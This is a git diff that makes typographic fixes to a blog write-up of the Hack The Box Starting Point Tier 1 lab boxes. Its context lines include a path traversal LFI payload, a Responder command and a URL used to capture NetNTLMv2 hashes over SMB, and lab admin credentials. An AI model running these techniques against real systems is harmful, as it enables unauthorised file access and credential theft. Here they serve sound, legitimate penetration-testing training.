@@ -1,10 +1,10 @@
 ---
-title: "HTB: Learn the basics of Penetration Testing - Tier 1"
+title: "HTB: Learn the basics of Penetration Testing – Tier 1"
 slug: "startingpoint-tier1"
 date: 2022-04-30T21:54:03-07:00
 draft: false
-description: "Short writeups for each of the Starting Point boxes on HTB - Tier 1"
-summary: "Short writeups for each of the [Starting Point](https://app.hackthebox.com/starting-point) boxes on HTB - Tier 1"
+description: "Short writeups for each of the Starting Point boxes on HTB – Tier 1"
+summary: "Short writeups for each of the [Starting Point](https://app.hackthebox.com/starting-point) boxes on HTB – Tier 1"
 categories: ["htb"]
 tags: ["sql","ftp","ntlm","smb","winrm","ssh","s3"]
 keywords: ["htb","hackthebox","appointment","sequel","crocodile","responder","three"]
@@ -131,7 +131,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 ### mysql
-Since `port 3306` is open, lets take a look into connecting to `mysql` (`sudo apt update && sudo apt install mysql*`) - an open-source relational database management system.
+Since `port 3306` is open, lets take a look into connecting to `mysql` (`sudo apt update && sudo apt install mysql*`) – an open-source relational database management system.
 
 We can run the following command and try for root right away:
 
@@ -278,7 +278,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ![dashboard](images/dashboard.png)
 
-Going for the throat with the `admin:rKXM59ESxesUFHAd` grants us access and the flag.
+Going for the throat with `admin:rKXM59ESxesUFHAd` grants us access and the flag.
 
 ![crocodile](images/crocodile.png)
 
@@ -349,7 +349,7 @@ ff02::2 ip6-allrouters
 That's better.
 ![unika](images/unika.png)
 
-After clicking around, something stood out after changing the language to French - the url changed to `http://unika.htb/index.php?page=french.html`. `page` is calling a file on the server, but can't we just change this file to be something else? Say, `/etc/hosts`:
+After clicking around, something stood out after changing the language to French – the url changed to `http://unika.htb/index.php?page=french.html`. `page` is calling a file on the server, but can't we just change this file to be something else? Say, `/etc/hosts`:
 
 `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`
 
@@ -369,7 +369,7 @@ localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # 
 Now that we know we can access files on the server, an `LFI` (Local File Include) vulnerability, perhaps we there is an `RFI` (Remote File Include) vulnerability. From our `nmap`, we know that the server hosting this page is a `Windows` machine. So, in order for us to test this RFI vulnerability, we will first need to learn a bit about `NTLM`.
 
 ### NTLM
-`NTLM` (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Notably, it is a `single sign-on` (SSO) which allows requires users to only be authenticated once. More details of `NTLM` and the authentication process can be found on [Crowdstrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/). Basically, there are tools — such as `Responder` — which allow us to listen in on the NTLM authentication and capture the `NetNTLMv2` hash. If we are able to crack this hash, we can then gain access to the server. Let's give it a go.
+`NTLM` (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Notably, it is a `single sign-on` (SSO) which allows requires users to only be authenticated once. More details of `NTLM` and the authentication process can be found on [Crowdstrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/). Basically, there are tools – such as `Responder` – which allow us to listen in on the NTLM authentication and capture the `NetNTLMv2` hash. If we are able to crack this hash, we can then gain access to the server. Let's give it a go.
 
 ### Responder
 `Responder` (`git clone https://github.com/lgandx/Responder`), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the `NetNTLMv2` hash. This can be done by:
@@ -378,7 +378,7 @@ Now that we know we can access files on the server, an `LFI` (Local File Include
 sudo python3 Responder.py -I tun0
 ```
 
-Now we will have the server interact with this SMB server (hosted on your client IP — mine being `10.10.14.165`) by changing the URL in our browser to:
+Now we will have the server interact with this SMB server (hosted on your client IP – mine being `10.10.14.165`) by changing the URL in our browser to:
 
 `http://unika.htb/index.php?page=//10.10.14.165/any_file_name`
 
@@ -521,7 +521,7 @@ Still, no luck.
 
 After much trial and error, I ended up taking a look at the `htb` writeup for this challenge at this point. To my surprise, they simply run gobuster as I did, and find `s3.thetoppers.htb`
 
-Even after knowing the output, I spent much time testing `ffuf` and `gobuster` with no avail. I even tried text files only containing `s3`, but this was always missed by both tools. I even tried reseting the target machine and starting over, but this also failed. So, I'm going to chalk this up to something on `HackTheBox`'s end and continue pretending I found the `s3` subdomain.
+Even after knowing the output, I spent much time testing `ffuf` and `gobuster` with no avail. I even tried text files only containing `s3`, but this was always missed by both tools. I even tried resetting the target machine and starting over, but this also failed. So, I'm going to chalk this up to something on `HackTheBox`'s end and continue pretending I found the `s3` subdomain.
 
 Don't forget to add `s3.thetoppers.htb` to `/etc/hosts`
 
